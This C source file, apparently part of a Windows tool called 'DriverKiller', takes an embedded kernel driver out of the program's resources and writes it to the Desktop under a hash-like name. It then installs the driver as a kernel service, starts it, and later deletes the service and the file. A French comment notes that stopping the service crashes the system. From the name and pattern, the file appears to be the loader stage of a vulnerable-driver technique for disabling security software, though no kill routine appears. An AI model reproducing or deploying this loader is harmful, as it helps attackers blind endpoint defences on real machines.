#include <windows.h>
#include <winsvc.h>
#include <shlobj.h>
#include <stdio.h>
#include "DriverKiller.h"

BOOL ExtractDriver(wchar_t* path) {

	wchar_t desktopPath[MAX_PATH];
	wchar_t completePath[MAX_PATH];

	HRSRC hResDriver = FindResource(NULL, MAKEINTRESOURCEW(RES_DRIVER), RT_RCDATA);
	if (!hResDriver)
		return FALSE;
		
	DWORD resSize = SizeofResource(NULL, hResDriver);
	if (resSize == 0)
		return FALSE;

	HGLOBAL hResData = LoadResource(NULL, hResDriver);
	if (!hResData)
		return FALSE;

	LPVOID pResData = LockResource(hResData);
	if (!pResData)
		return FALSE;

	if (SHGetSpecialFolderPath(NULL, desktopPath, CSIDL_DESKTOP, FALSE) == FALSE)
		return FALSE;

	swprintf_s(completePath, MAX_PATH, L"%s\\8e92cc393a7f6acda90fff42925c42d2082dad593740ae2698d597dca5d1e7fc.sys", desktopPath);

	HANDLE hDriverFile = CreateFile(completePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriverFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!WriteFile(hDriverFile, pResData, resSize, NULL, NULL)) {
		CloseHandle(hDriverFile);
		DeleteFile(completePath);
		return FALSE;
	}

	CloseHandle(hDriverFile);

	wcscpy_s(path, MAX_PATH, completePath);

	return TRUE;
}

BOOL InstallAndStartDriver(wchar_t* Path, LPCWSTR serviceName) {

	SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCM)
		return FALSE;

	SC_HANDLE hSVC = OpenServiceW(hSCM, serviceName, SERVICE_START | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS);

	if (!hSVC) {
		hSVC = CreateServiceW(
			hSCM,
			serviceName,
			serviceName,
			SERVICE_START | DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_DEMAND_START,
			SERVICE_ERROR_NORMAL,
			Path,
			NULL, NULL, NULL, NULL, NULL
		);
		
		if (!hSVC) {
			CloseServiceHandle(hSCM);
			return FALSE;
		}
	}

	if (!StartServiceW(hSVC, 0, NULL)) {
		CloseServiceHandle(hSVC);
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	CloseServiceHandle(hSVC);
	CloseServiceHandle(hSCM);
	return TRUE;

}

BOOL StopAndRemoveDriver(LPCWSTR serviceName, wchar_t* path) {

	SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCM)
		return FALSE;

	SC_HANDLE hSVC = OpenServiceW(hSCM, serviceName, DELETE | SERVICE_STOP);
	if (!hSVC) {
		CloseServiceHandle(hSCM);
		return FALSE;
	}	

	if (!DeleteService(hSVC)) {
		CloseServiceHandle(hSVC);
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	//Arreter le service provoque un crash (comportement du driver). Décommenter pour activer l'arret du service.
	//SERVICE_STATUS s;
	//ControlService(hSVC, SERVICE_CONTROL_STOP, &s);
	CloseServiceHandle(hSVC);
	CloseServiceHandle(hSCM);

	DeleteFileW(path);
	return TRUE;
}

BOOL CheckDriver(LPCWSTR serviceName) {

	SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (!hSCM) {
		return FALSE;
	}

	SC_HANDLE hSVC = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS);
	if (!hSVC) {
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	SERVICE_STATUS_PROCESS stat;
	DWORD bytesNeeded = 0;
	if (!QueryServiceStatusEx(hSVC, SC_STATUS_PROCESS_INFO, (BYTE*)&stat, sizeof stat, &bytesNeeded)) {
		CloseServiceHandle(hSVC);
		CloseServiceHandle(hSCM);
		return FALSE;
	}


	if (stat.dwCurrentState == SERVICE_RUNNING) {
		CloseServiceHandle(hSVC);
		CloseServiceHandle(hSCM);
		return TRUE;
	}
	else {
		StartServiceW(hSVC, 0, NULL);
	}

	CloseServiceHandle(hSVC);
	CloseServiceHandle(hSCM);
	return TRUE;
}

